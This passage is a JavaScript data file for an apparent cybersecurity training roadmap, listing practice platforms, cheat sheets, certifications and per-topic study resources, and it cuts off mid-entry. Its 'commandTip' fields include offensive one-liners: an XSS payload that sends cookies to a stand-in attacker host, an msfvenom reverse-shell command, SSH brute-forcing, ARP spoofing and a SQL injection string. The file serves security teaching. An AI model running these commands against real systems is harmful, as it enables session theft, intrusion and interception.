// E-HACKER Comprehensive Resources, Practice Platforms & Topic Learning Guides
// Maps all 37 roadmap curriculum topics, certifications, and wargames across all 6 focus tracks.

export const PRACTICE_PLATFORMS = [
    {
        name: "PortSwigger Web Security Academy",
        cat: "Web Application Security",
        track: "web",
        desc: "Free, interactive web security training from the creators of Burp Suite. Covers SQLi, XSS, CSRF, SSRF, OAuth, and business logic flaws with 250+ labs.",
        link: "https://portswigger.net/web-security",
        badge: "Free - Best for Web"
    },
    {
        name: "Hack The Box (HTB)",
        cat: "Offensive Security & CTF",
        track: "full",
        desc: "Premier cyber training platform with 500+ retired and active VMs, Pro Labs, Fortresses, and Tracks covering AD, Web, RE, and Crypto.",
        link: "https://www.hackthebox.com",
        badge: "Hands-on VMs"
    },
    {
        name: "TryHackMe (THM)",
        cat: "Beginner to Intermediate CTF",
        track: "full",
        desc: "Gamified, browser-based hands-on rooms covering cybersecurity fundamentals, network exploitation, SOC defense, and guided attack paths.",
        link: "https://tryhackme.com",
        badge: "Guided Learning"
    },
    {
        name: "OverTheWire Wargames",
        cat: "Linux & Binary Exploitation",
        track: "network",
        desc: "Legendary SSH wargames: Bandit (Linux basics), Natas (Web), Leviathan, Narnia (Binary), Behemoth, Krypton (Crypto).",
        link: "https://overthewire.org/wargames",
        badge: "Free SSH Wargame"
    },
    {
        name: "CyberDefenders",
        cat: "Blue Team & SOC Forensics",
        track: "soc",
        desc: "Hands-on defense training with realistic PCAP forensics, memory dumps, SIEM investigation challenges, and malware analysis labs.",
        link: "https://cyberdefenders.org",
        badge: "Blue Team Labs"
    },
    {
        name: "PicoCTF",
        cat: "Cyber Competitions & CTF",
        track: "full",
        desc: "Carnegie Mellon University's free educational CTF with progressive challenges in cryptography, reverse engineering, web, forensics, and pwn.",
        link: "https://picoctf.org",
        badge: "Free CTF"
    },
    {
        name: "HackTheBox Academy",
        cat: "Structured Learning Paths",
        track: "full",
        desc: "Structured module-based training with Tier 0-2 learning paths covering Penetration Testing, SOC, Bug Bounty, and DevSecOps.",
        link: "https://academy.hackthebox.com",
        badge: "Modules & Paths"
    },
    {
        name: "VulnHub",
        cat: "Offline VM Practice",
        track: "network",
        desc: "Downloadable intentionally vulnerable VMs for local exploitation practice. Great for OSCP preparation with 700+ machines.",
        link: "https://www.vulnhub.com",
        badge: "Offline VMs"
    },
    {
        name: "Immersive Labs",
        cat: "Enterprise Cyber Range",
        track: "soc",
        desc: "Cloud-hosted cyber range with real-world attack scenarios, SOC investigations, threat hunting, and crisis simulation exercises.",
        link: "https://www.immersivelabs.com",
        badge: "Enterprise"
    },
    {
        name: "PentesterLab",
        cat: "Web Exploitation & Code Review",
        track: "web",
        desc: "Progressive hands-on exercises teaching web vulnerabilities from basic XSS to advanced deserialization, JWT, and OAuth attacks.",
        link: "https://pentesterlab.com",
        badge: "Web Pentest"
    },
    {
        name: "RingZer0 CTF",
        cat: "Multi-Category CTF",
        track: "malware",
        desc: "500+ challenges across cryptography, JavaScript deobfuscation, binary exploitation, SQL injection, and steganography.",
        link: "https://ringzer0ctf.com",
        badge: "500+ Challenges"
    },
    {
        name: "Damn Vulnerable Web Application (DVWA)",
        cat: "Local Web Lab",
        track: "web",
        desc: "PHP/MySQL web app that is intentionally vulnerable. Four security levels (Low, Medium, High, Impossible) for progressive learning.",
        link: "https://github.com/digininja/DVWA",
        badge: "Self-hosted Lab"
    },
    {
        name: "OWASP Juice Shop",
        cat: "Modern Web Security Lab",
        track: "web",
        desc: "Intentionally insecure modern web application (Node.js/Angular) with 100+ hacking challenges aligned to OWASP Top 10.",
        link: "https://owasp.org/www-project-juice-shop",
        badge: "OWASP Official"
    },
    {
        name: "Exploit Education (Phoenix)",
        cat: "Binary Exploitation",
        track: "malware",
        desc: "Linux binary exploitation training covering stack overflows, format strings, heap exploitation, and networking challenges.",
        link: "https://exploit.education",
        badge: "Binary / Pwn"
    },
    {
        name: "LetsDefend",
        cat: "SOC Analyst Training",
        track: "soc",
        desc: "Simulated SOC environment with realistic alerts, SIEM dashboards, malware analysis, and incident response playbooks.",
        link: "https://letsdefend.io",
        badge: "SOC Simulator"
    },
    {
        name: "Blue Team Labs Online (BTLO)",
        cat: "Blue Team Defense",
        track: "soc",
        desc: "Defensive cybersecurity challenges covering log analysis, disk forensics, reverse engineering, and network analysis.",
        link: "https://blueteamlabs.online",
        badge: "Blue Team"
    },
    {
        name: "Lakera Gandalf AI CTF",
        cat: "AI Red Teaming & Prompt Injection",
        track: "full",
        desc: "Browser-based gamified prompt injection sandbox testing progressive defensive guardrails against adversarial jailbreaks.",
        link: "https://gandalf.lakera.ai",
        badge: "AI Security"
    },
    {
        name: "OSINT Dojo",
        cat: "Open Source Intelligence Training",
        track: "osint",
        desc: "Free progressive belt-ranking curriculum and verification challenges for open source intelligence analysts.",
        link: "https://www.osintdojo.com",
        badge: "OSINT Dojo"
    }
];

export const STANDARDS_AND_CHEATSHEETS = [
    {
        name: "MITRE ATT&CK Matrix",
        cat: "Adversary Tactics & Techniques",
        track: "full",
        desc: "Globally accessible knowledge base of adversary tactics and techniques based on real-world threat observations. 14 tactics, 200+ techniques.",
        link: "https://attack.mitre.org",
        badge: "Industry Standard"
    },
    {
        name: "PayloadsAllTheThings",
        cat: "Exploitation & Payloads",
        track: "web",
        desc: "Massive curated payload reference for SQL injection, XSS, SSRF, XXE, command injection, deserialization, and directory traversal.",
        link: "https://github.com/swisskyrepo/PayloadsAllTheThings",
        badge: "GitHub 60k+ Stars"
    },
    {
        name: "GTFOBins",
        cat: "Linux Privilege Escalation",
        track: "network",
        desc: "Curated list of Unix binaries that can bypass local security restrictions for file read, SUID escalation, and reverse shells.",
        link: "https://gtfobins.github.io",
        badge: "PrivEsc Essential"
    },
    {
        name: "LOLBAS Project",
        cat: "Windows Living Off The Land",
        track: "network",
        desc: "Living Off The Land Binaries, Scripts, and Libraries for Windows defense evasion, code execution, and credential theft.",
        link: "https://lolbas-project.github.io",
        badge: "Windows LOLBins"
    },
    {
        name: "OWASP Cheat Sheet Series",
        cat: "Defensive Coding & Architecture",
        track: "web",
        desc: "High-value secure development guidelines covering authentication, session management, input validation, and cryptographic storage.",
        link: "https://cheatsheetseries.owasp.org",
        badge: "OWASP Official"
    },
    {
        name: "OWASP Top 10 for LLM Applications",
        cat: "AI Security & GenAI Defense",
        track: "full",
        desc: "Official OWASP standard for LLM01: Prompt Injection, LLM02: Sensitive Info Disclosure, LLM06: Excessive Agency, and RAG poisoning.",
        link: "https://owasp.org/www-project-top-10-for-large-language-model-applications",
        badge: "AI Standard"
    },
    {
        name: "CyberChef (GCHQ)",
        cat: "Data Encoding & Crypto",
        track: "full",
        desc: "The Cyber Swiss Army Knife - web app for encryption, encoding, compression, hashing, and data analysis by UK GCHQ.",
        link: "https://gchq.github.io/CyberChef",
        badge: "GCHQ Tool"
    },
    {
        name: "Exploit Database (Exploit-DB)",
        cat: "CVE & Public Exploit Archive",
        track: "network",
        desc: "OffSec-maintained archive of public exploits, shellcode, and vulnerable software. Searchable by CVE, platform, and type.",
        link: "https://www.exploit-db.com",
        badge: "OffSec Archive"
    },
    {
        name: "CISA KEV Catalog",
        cat: "Threat Intelligence",
        track: "soc",
        desc: "Cybersecurity & Infrastructure Security Agency catalog of Known Exploited Vulnerabilities actively targeted in the wild.",
        link: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
        badge: "CISA Official"
    },
    {
        name: "HackTricks Pentest Wiki",
        cat: "Comprehensive Pentest Wiki",
        track: "full",
        desc: "Massive pentesting methodology wiki covering Linux/Windows privesc, Active Directory, web attacks, cloud, mobile, and reversing.",
        link: "https://book.hacktricks.wiki",
        badge: "Must-Read Wiki"
    },
    {
        name: "HackTricks Cloud",
        cat: "Cloud Security & CI/CD",
        track: "web",
        desc: "Cloud-focused pentesting reference for AWS, Azure, GCP IAM exploitation, Kubernetes attacks, and CI/CD pipeline hijacking.",
        link: "https://cloud.hacktricks.wiki",
        badge: "Cloud Attacks"
    },
    {
        name: "SecLists",
        cat: "Wordlists & Fuzzing Payloads",
        track: "web",
        desc: "The security tester's companion - curated collection of fuzzing payloads, usernames, passwords, URLs, web shells, and directory lists.",
        link: "https://github.com/danielmiessler/SecLists",
        badge: "60k+ Stars"
    },
    {
        name: "WADComs",
        cat: "Active Directory Cheat Sheet",
        track: "network",
        desc: "Interactive cheat sheet for Windows/Active Directory attack commands organized by tool (Impacket, Rubeus, Mimikatz, CrackMapExec).",
        link: "https://wadcoms.github.io",
        badge: "AD Commands"
    },
    {
        name: "NIST Cybersecurity Framework (CSF)",
        cat: "Governance & Risk Framework",
        track: "soc",
        desc: "US National Institute of Standards framework for managing cybersecurity risk. Core functions: Identify, Protect, Detect, Respond, Recover.",
        link: "https://www.nist.gov/cyberframework",
        badge: "NIST Official"
    },
    {
        name: "RevShells",
        cat: "Reverse Shell Generator",
        track: "network",
        desc: "Online reverse shell payload generator supporting Bash, Python, PHP, PowerShell, Perl, Ruby, Netcat, and encoded variants.",
        link: "https://www.revshells.com",
        badge: "Shell Generator"
    },
    {
        name: "VirusTotal",
        cat: "Malware & IOC Analysis",
        track: "malware",
        desc: "Free service that analyzes files, URLs, IPs, and domains for malware and automatically shares them with the security community.",
        link: "https://www.virustotal.com",
        badge: "Google Subsidiary"
    },
    {
        name: "OSINT Framework",
        cat: "Reconnaissance Directory",
        track: "osint",
        desc: "Tree-structured collection of OSINT tools covering domains, IP addresses, email lookups, social media, and geolocation intelligence.",
        link: "https://osintframework.com",
        badge: "OSINT Tree"
    }
];

export const CERTIFICATIONS_ROADMAP = [
    {
        name: "CompTIA Security+ (SY0-701)",
        provider: "CompTIA",
        level: "Foundational",
        track: "full",
        desc: "Globally recognized baseline certification covering core security principles, threat analysis, risk management, and cryptography.",
        link: "https://www.comptia.org/certifications/security"
    },
    {
        name: "eJPT (eLearnSecurity Junior Penetration Tester)",
        provider: "INE Security",
        level: "Entry Offensive",
        track: "network",
        desc: "100% practical hands-on exam evaluating dynamic reconnaissance, host assessment, and web exploitation skills.",
        link: "https://security.ine.com/certifications/ejpt-certification"
    },
    {
        name: "PNPT (Practical Network Penetration Tester)",
        provider: "TCM Security",
        level: "Intermediate Offensive",
        track: "network",
        desc: "Realistic 5-day penetration testing exam simulating full internal/external assessment, OSINT, AD exploitation, and executive debrief.",
        link: "https://certifications.tcm-sec.com/pnpt"
    },
    {
        name: "OSCP (OffSec Certified Professional)",
        provider: "OffSec",
        level: "Advanced Offensive",
        track: "network",
        desc: "The gold standard practical penetration testing certification requiring a 24-hour hands-on exam with active standalone and AD machines.",
        link: "https://www.offsec.com/courses/pen-200"
    },
    {
        name: "OSWE (OffSec Web Expert)",
        provider: "OffSec",
        level: "Expert Web",
        track: "web",
        desc: "Advanced white-box web application security certification covering source code review, deserialization, and custom exploit development.",
        link: "https://www.offsec.com/courses/web-300"
    },
    {
        name: "OSEP (OffSec Experienced Penetration Tester)",
        provider: "OffSec",
        level: "Expert Offensive",
        track: "network",
        desc: "Advanced evasion and red team certification covering antivirus bypass, AMSI evasion, lateral movement, and process injection.",
        link: "https://www.offsec.com/courses/pen-300"
    },
    {
        name: "CRTP (Certified Red Team Professional)",
        provider: "Altered Security",
        level: "Intermediate AD",
        track: "network",
        desc: "Hands-on Active Directory attack certification covering Kerberoasting, delegation abuse, ADCS, and forest trust attacks.",
        link: "https://www.alteredsecurity.com/adlab"
    },
    {
        name: "CRTO (Certified Red Team Operator)",
        provider: "Zero-Point Security",
        level: "Intermediate Red Team",
        track: "network",
        desc: "Hands-on red team certification using Cobalt Strike and Havoc C2 frameworks in a realistic multi-domain enterprise lab.",
        link: "https://training.zeropointsecurity.co.uk/courses/red-team-ops"
    },
    {
        name: "BTL1 (Blue Team Level 1)",
        provider: "Security Blue Team",
        level: "Entry Blue Team",
        track: "soc",
        desc: "Practical blue team certification covering phishing analysis, digital forensics, SIEM log analysis, and threat intelligence.",
        link: "https://www.securityblue.team/certifications/blue-team-level-1"
    },
    {
        name: "CCD (Certified CyberDefender)",
        provider: "CyberDefenders",
        level: "Intermediate Blue Team",
        track: "soc",
        desc: "Hands-on blue team certification with real-world incident analysis covering network forensics, endpoint forensics, and malware analysis.",
        link: "https://cyberdefenders.org/blue-team-training/courses/certified-cyberdefender"
    },
    {
        name: "Google Cybersecurity Certificate",
        provider: "Google (Coursera)",
        level: "Foundational (Free)",
        track: "full",
        desc: "Free professional certificate covering security foundations, network security, Linux, SQL, Python, incident detection, and response.",
        link: "https://www.coursera.org/google-certificates/cybersecurity-certificate"
    },
    {
        name: "SC-200 (Microsoft Security Operations Analyst)",
        provider: "Microsoft",
        level: "Intermediate SOC",
        track: "soc",
        desc: "Microsoft certification for SOC analysts covering Microsoft Sentinel, Defender XDR, KQL queries, and threat hunting.",
        link: "https://learn.microsoft.com/en-us/credentials/certifications/security-operations-analyst"
    },
    {
        name: "GPEN (GIAC Penetration Tester)",
        provider: "SANS / GIAC",
        level: "Advanced Offensive",
        track: "network",
        desc: "SANS-backed certification covering comprehensive penetration testing methodology, password attacks, and exploitation techniques.",
        link: "https://www.giac.org/certifications/penetration-tester-gpen"
    },
    {
        name: "GCIH (GIAC Certified Incident Handler)",
        provider: "SANS / GIAC",
        level: "Advanced Blue Team",
        track: "soc",
        desc: "Incident handling and response certification covering attack detection, containment, eradication, and recovery procedures.",
        link: "https://www.giac.org/certifications/certified-incident-handler-gcih"
    }
];

// ============================================================================
// COMPREHENSIVE TOPIC RESOURCES MAP
// Maps all 37 skills across STG-01 through STG-06, plus OSINT tracks
// ============================================================================
export const TOPIC_RESOURCES = {
    // ------------------------------------------------------------------------
    // STAGE 1: Pre-Security & Core Fundamentals
    // ------------------------------------------------------------------------
    "sec-fund": {
        title: "Security Architecture & CIA Triad",
        stage: "STG-01",
        track: "full",
        summary: "Understand confidentiality, integrity, availability, defense-in-depth, non-repudiation, and risk calculation frameworks (STRIDE, DREAD, NIST CSF).",
        docs: "https://csrc.nist.gov/glossary/term/cia_triad",
        cheatsheet: "https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html",
        lab: "https://tryhackme.com/module/principles-of-security",
        resources: [
            { name: "NIST SP 800-53 Security & Privacy Controls", url: "https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final", type: "spec" },
            { name: "OWASP Threat Modeling Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Threat_Modeling_Cheat_Sheet.html", type: "cheatsheet" },
            { name: "TryHackMe: Principles of Security Room", url: "https://tryhackme.com/module/principles-of-security", type: "lab" },
            { name: "Professor Messer CompTIA Security+ SY0-701 Playlist", url: "https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/sy0-701-training-course/", type: "video" }
        ],
        commandTip: "openssl dgst -sha256 file.bin  # Verify data integrity via cryptographic hash"
    },
    "linux-cli": {
        title: "Linux Bash CLI & File Permissions (chmod/chown)",
        stage: "STG-01",
        track: "network",
        summary: "Master Linux terminal navigation, octal file permissions, SUID/SGID bits, process inspection, pipeline filtering, and text manipulation with grep/awk/sed.",
        docs: "https://linuxjourney.com",
        cheatsheet: "https://gtfobins.github.io",
        lab: "https://overthewire.org/wargames/bandit/",
        resources: [
            { name: "Linux Journey (Free Interactive Linux Course)", url: "https://linuxjourney.com", type: "docs" },
            { name: "OverTheWire: Bandit SSH Wargame (Levels 0-34)", url: "https://overthewire.org/wargames/bandit/", type: "lab" },
            { name: "GTFOBins: Unix Binaries SUID/PrivEsc Reference", url: "https://gtfobins.github.io", type: "cheatsheet" },
            { name: "ExplainShell: Visual CLI Command Breakdown", url: "https://explainshell.com", type: "tool" }
        ],
        commandTip: "find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null  # Locate all SUID binaries"
    },
    "net-tcp": {
        title: "TCP/IP 3-Way Handshake & OSI Model",
        stage: "STG-01",
        track: "network",
        summary: "Dissect Layer 1 through Layer 7 of the OSI & TCP/IP stack. Learn SYN, SYN-ACK, ACK handshake sequence, TCP flags (RST, FIN, PSH, URG), MTU, and IP subnetting.",
        docs: "https://www.ietf.org/rfc/rfc793.txt",
        cheatsheet: "https://packetlife.net/library/cheat-sheets/",
        lab: "https://tryhackme.com/module/network-fundamentals",
        resources: [
            { name: "RFC 793: Transmission Control Protocol Specification", url: "https://www.ietf.org/rfc/rfc793.txt", type: "spec" },
            { name: "PacketLife: Networking & Protocol Cheat Sheets", url: "https://packetlife.net/library/cheat-sheets/", type: "cheatsheet" },
            { name: "TryHackMe: Network Fundamentals Path", url: "https://tryhackme.com/module/network-fundamentals", type: "lab" },
            { name: "Professor Messer: TCP/IP & OSI Video Guide", url: "https://www.youtube.com/watch?v=LANW3m7Bgkw", type: "video" }
        ],
        commandTip: "tcpdump -nn -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'  # Capture TCP SYN handshake packets"
    },
    "web-http": {
        title: "HTTP/1.1 & HTTP/2 Request/Response Anatomy",
        stage: "STG-01",
        track: "web",
        summary: "Understand HTTP methods (GET, POST, PUT, DELETE, OPTIONS, HEAD), headers, status codes (2xx, 3xx, 4xx, 5xx), cookies, session management, and HTTP/2 multiplexing.",
        docs: "https://developer.mozilla.org/en-US/docs/Web/HTTP",
        cheatsheet: "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers",
        lab: "https://portswigger.net/web-security",
        resources: [
            { name: "MDN Web Docs: Comprehensive HTTP Protocols Guide", url: "https://developer.mozilla.org/en-US/docs/Web/HTTP", type: "docs" },
            { name: "PortSwigger Web Security Academy: HTTP Basics", url: "https://portswigger.net/web-security", type: "lab" },
            { name: "OWASP Secure Headers Project Guide", url: "https://owasp.org/www-project-secure-headers/", type: "spec" },
            { name: "HTTP Status Dogs / Cats Illustrated Reference", url: "https://httpstatusdogs.com", type: "cheatsheet" }
        ],
        commandTip: "curl -iv -X OPTIONS https://target.local/ -H 'User-Agent: AuditingBot/1.0'"
    },
    "dns-recon": {
        title: "DNS Record Types & Resolution Mechanics",
        stage: "STG-01",
        track: "osint",
        summary: "Deep-dive into DNS architecture: root nameservers, TLD, recursive vs authoritative queries, and key record types: A, AAAA, CNAME, MX, TXT, SPF, DKIM, and AXFR zone transfers.",
        docs: "https://www.cloudflare.com/learning/dns/what-is-dns/",
        cheatsheet: "https://cheatsheetseries.owasp.org/cheatsheets/DNS_Security_Cheat_Sheet.html",
        lab: "https://tryhackme.com/room/dnsindetail",
        resources: [
            { name: "Cloudflare Learning: How DNS Works", url: "https://www.cloudflare.com/learning/dns/what-is-dns/", type: "docs" },
            { name: "OWASP DNS Security Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/DNS_Security_Cheat_Sheet.html", type: "cheatsheet" },
            { name: "TryHackMe: DNS in Detail Interactive Lab", url: "https://tryhackme.com/room/dnsindetail", type: "lab" },
            { name: "DNSDumpster: Domain Research & Reconnaissance", url: "https://dnsdumpster.com", type: "tool" }
        ],
        commandTip: "dig +nocmd target.local axfr @ns1.target.local +multiline  # Attempt DNS Zone Transfer"
    },
    "py-basics": {
        title: "Python Scripting for Sockets & Automation",
        stage: "STG-01",
        track: "network",
        summary: "Write custom offensive and defensive tools using Python: low-level network sockets, HTTP client requests, multi-threading port scanning, and automated log parsing.",
        docs: "https://docs.python.org/3/library/socket.html",
        cheatsheet: "https://github.com/inconvergent/weird/raw/master/python-cheatsheet.pdf",
        lab: "https://github.com/justin-p/black-hat-python-2e",
        resources: [
            { name: "Python Official Socket Programming HOWTO", url: "https://docs.python.org/3/howto/sockets.html", type: "docs" },
            { name: "Black Hat Python: Python for Hackers & Pentesters Repo", url: "https://github.com/justin-p/black-hat-python-2e", type: "docs" },
            { name: "Automate the Boring Stuff with Python (Free Book)", url: "https://automatetheboringstuff.com", type: "docs" },
            { name: "TryHackMe: Python for Cybersecurity", url: "https://tryhackme.com/room/pythonbasics", type: "lab" }
        ],
        commandTip: "python3 -c 'import socket; s=socket.socket(); s.connect((\"10.10.10.10\", 443)); print(\"OPEN\")'"
    },

    // ------------------------------------------------------------------------
    // STAGE 2: Network Auditing & Traffic Forensics
    // ------------------------------------------------------------------------
    "nmap-audit": {
        title: "Nmap SYN, UDP & NSE Script Scanning",
        stage: "STG-02",
        track: "network",
        summary: "Master network discovery: stealth SYN scans (-sS), UDP audits (-sU), OS fingerprinting (-O), banner grabbing (-sV), and NSE scripts for vulnerability detection.",
        docs: "https://nmap.org/book/man.html",
        cheatsheet: "https://highon.coffee/blog/nmap-cheat-sheet/",
        lab: "https://tryhackme.com/room/furthernmap",
        resources: [
            { name: "Nmap Official Reference Guide (Fyodor)", url: "https://nmap.org/book/man.html", type: "docs" },
            { name: "HighOnCoffee Nmap Pentest Cheat Sheet", url: "https://highon.coffee/blog/nmap-cheat-sheet/", type: "cheatsheet" },
            { name: "TryHackMe: Further Nmap Practice Room", url: "https://tryhackme.com/room/furthernmap", type: "lab" },
            { name: "Nmap NSE Script Categories & Documentation", url: "https://nmap.org/nsedoc/", type: "spec" }
        ],
        commandTip: "nmap -sS -sV -sC -T4 -p- -oA initial_scan 10.10.11.0/24"
    },
    "wireshark-audit": {
        title: "Wireshark Display Filters & TCP Stream Reassembly",
        stage: "STG-02",
        track: "soc",
        summary: "Capture and dissect raw network traffic: filter syntax, Follow TCP Stream, extract unencrypted credentials, carve transferred files, and detect beaconing channels.",
        docs: "https://www.wireshark.org/docs/wsug_html_chunked/",
        cheatsheet: "https://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf",
        lab: "https://cyberdefenders.org/blueteam-ctf-challenges/",
        resources: [
            { name: "Wireshark User's Guide (Official Documentation)", url: "https://www.wireshark.org/docs/wsug_html_chunked/", type: "docs" },
            { name: "PacketLife: Wireshark Display Filters Quick Reference", url: "https://packetlife.net/media/library/13/Wireshark_Display_Filters.pdf", type: "cheatsheet" },
            { name: "CyberDefenders: Free PCAP Forensics Challenges", url: "https://cyberdefenders.org/blueteam-ctf-challenges/", type: "lab" },
            { name: "Malware-Traffic-Analysis.net (Brad Duncan's PCAP Vault)", url: "https://www.malware-traffic-analysis.net", type: "lab" }
        ],
        commandTip: "tshark -r capture.pcap -Y 'http.request.method == \"POST\"' -T fields -e http.file_data"
    },
    "metasploit-exploit": {
        title: "Metasploit Multi-Handler & Staged Payloads",
        stage: "STG-02",
        track: "network",
        summary: "Operate the Metasploit Framework: msfconsole, payload generation with msfvenom, exploit configuration, multi/handler listeners, and post-exploitation Meterpreter commands.",
        docs: "https://docs.metasploit.com",
        cheatsheet: "https://www.stationx.net/metasploit-cheat-sheet/",
        lab: "https://tryhackme.com/room/rpmetasploit",
        resources: [
            { name: "Metasploit Documentation & Module Reference", url: "https://docs.metasploit.com", type: "docs" },
            { name: "Metasploit Cheat Sheet (StationX)", url: "https://www.stationx.net/metasploit-cheat-sheet/", type: "cheatsheet" },
            { name: "TryHackMe: Metasploit Introductory Room", url: "https://tryhackme.com/room/rpmetasploit", type: "lab" },
            { name: "Rapid7 Vulnerability & Exploit Database", url: "https://www.rapid7.com/db/", type: "docs" }
        ],
        commandTip: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf"
    },
    "mitm-arp": {
        title: "ARP Spoofing & SSL Stripping MitM Attacks",
        stage: "STG-02",
        track: "network",
        summary: "Understand Layer 2 ARP cache poisoning, gateway spoofing, traffic interception with Bettercap/Ettercap, and SSL stripping defenses like HSTS and ARP inspection (DAI).",
        docs: "https://www.bettercap.org/intro/",
        cheatsheet: "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/arp-spoofing.html",
        lab: "https://tryhackme.com/room/mitm",
        resources: [
            { name: "Bettercap Official Framework Documentation", url: "https://www.bettercap.org/intro/", type: "docs" },
            { name: "HackTricks: Pentesting Network ARP Spoofing", url: "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/arp-spoofing.html", type: "cheatsheet" },
            { name: "TryHackMe: Man-in-the-Middle Attacks Lab", url: "https://tryhackme.com/room/mitm", type: "lab" },
            { name: "Cisco Dynamic ARP Inspection (DAI) Configuration Guide", url: "https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst4500/12-2/25ew/configuration/guide/conf/dynarp.html", type: "spec" }
        ],
        commandTip: "arpspoof -i eth0 -t 192.168.1.50 -r 192.168.1.1  # Bidirectional ARP Cache Poisoning"
    },
    "ssh-hydra": {
        title: "Hydra Automated Service Credential Auditing",
        stage: "STG-02",
        track: "network",
        summary: "Audit network authentication resilience using THC-Hydra against SSH, FTP, RDP, SMB, and HTTP-POST. Learn rate-limiting, account lockout rules, and fail2ban evasion.",
        docs: "https://github.com/vanhauser-thc/thc-hydra",
        cheatsheet: "https://infosecaddicts.com/hydra-cheat-sheet/",
        lab: "https://tryhackme.com/room/hydra",
        resources: [
            { name: "THC-Hydra Official GitHub Repository & Manual", url: "https://github.com/vanhauser-thc/thc-hydra", type: "docs" },
            { name: "Hydra Syntax & Attack Cheat Sheet", url: "https://infosecaddicts.com/hydra-cheat-sheet/", type: "cheatsheet" },
            { name: "TryHackMe: Hydra Brute-Force Room", url: "https://tryhackme.com/room/hydra", type: "lab" },
            { name: "SecLists Common Passwords & Usernames List", url: "https://github.com/danielmiessler/SecLists", type: "tool" }
        ],
        commandTip: "hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.10.11.20 -s 22"
    },
    "snmp-enum": {
        title: "SNMP Community String MIB Enumeration",
        stage: "STG-02",
        track: "network",
        summary: "Interrogate Simple Network Management Protocol (v1, v2c, v3). Guess community strings (public, private) to walk MIB trees for running processes, interfaces, and credentials.",
        docs: "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html",
        cheatsheet: "https://highon.coffee/blog/snmp-enumeration-cheat-sheet/",
        lab: "https://www.hackthebox.com",
        resources: [
            { name: "HackTricks: Pentesting SNMP Service", url: "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/index.html", type: "cheatsheet" },
            { name: "HighOnCoffee: SNMP Enumeration Cheat Sheet", url: "https://highon.coffee/blog/snmp-enumeration-cheat-sheet/", type: "cheatsheet" },
            { name: "SNMPWalk & Onesirty Community Guesser Tool Docs", url: "https://github.com/trailofbits/onesixtyone", type: "tool" },
            { name: "OID Repository (Object Identifiers Database)", url: "http://www.oid-info.com", type: "docs" }
        ],
        commandTip: "snmpwalk -c public -v1 10.10.11.35 1.3.6.1.4.1.77.1.2.25  # Enumerate Windows users via SNMP"
    },

    // ------------------------------------------------------------------------
    // STAGE 3: Web Application Penetration Testing
    // ------------------------------------------------------------------------
    "sqli-mastery": {
        title: "SQL Injection (UNION, Blind, Time-Based)",
        stage: "STG-03",
        track: "web",
        summary: "Exploit vulnerable database queries: UNION-based data dumping, error-based exploitation, Boolean-based blind character extraction, time delays (pg_sleep/WAITFOR), and out-of-band exfiltration.",
        docs: "https://portswigger.net/web-security/sql-injection",
        cheatsheet: "https://portswigger.net/web-security/sql-injection/cheat-sheet",
        lab: "https://portswigger.net/web-security/sql-injection#labs",
        resources: [
            { name: "PortSwigger Web Security Academy: SQL Injection Track", url: "https://portswigger.net/web-security/sql-injection", type: "lab" },
            { name: "PortSwigger Official SQL Injection Cheat Sheet", url: "https://portswigger.net/web-security/sql-injection/cheat-sheet", type: "cheatsheet" },
            { name: "PayloadsAllTheThings: SQL Injection Payloads Collection", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection", type: "cheatsheet" },
            { name: "sqlmap: Automated SQL Injection & DB Takeover Tool", url: "https://sqlmap.org", type: "tool" }
        ],
        commandTip: "' UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema=database()-- -"
    },
    "xss-audit": {
        title: "Cross-Site Scripting (Reflected, Stored, DOM)",
        stage: "STG-03",
        track: "web",
        summary: "Audit client-side script execution contexts: reflected parameter injection, persistent database stored scripts, DOM-based sinks (innerHTML, eval), CSP bypasses, and session hijacking.",
        docs: "https://portswigger.net/web-security/cross-site-scripting",
        cheatsheet: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet",
        lab: "https://portswigger.net/web-security/cross-site-scripting#labs",
        resources: [
            { name: "PortSwigger Academy: Cross-Site Scripting (XSS)", url: "https://portswigger.net/web-security/cross-site-scripting", type: "lab" },
            { name: "PortSwigger XSS Filter Evasion & Payload Cheat Sheet", url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet", type: "cheatsheet" },
            { name: "OWASP Cross Site Scripting Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html", type: "spec" },
            { name: "DOMPurify: Fast, Tolerant XSS Sanitizer for HTML", url: "https://github.com/cure53/DOMPurify", type: "tool" }
        ],
        commandTip: "<img src=x onerror=\"fetch('https://c2.attacker.com/steal?c='+encodeURIComponent(document.cookie))\">"
    },
    "ssrf-cloud": {
        title: "Server-Side Request Forgery & Cloud IMDS Theft",
        stage: "STG-03",
        track: "web",
        summary: "Force servers to initiate requests to internal services: bypass localhost filters, interrogate AWS/Azure/GCP instance metadata services (169.254.169.254), and steal temporary IAM STS credentials.",
        docs: "https://portswigger.net/web-security/ssrf",
        cheatsheet: "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html",
        lab: "https://portswigger.net/web-security/ssrf#labs",
        resources: [
            { name: "PortSwigger Academy: SSRF Interactive Labs", url: "https://portswigger.net/web-security/ssrf", type: "lab" },
            { name: "HackTricks: Server-Side Request Forgery Techniques", url: "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html", type: "cheatsheet" },
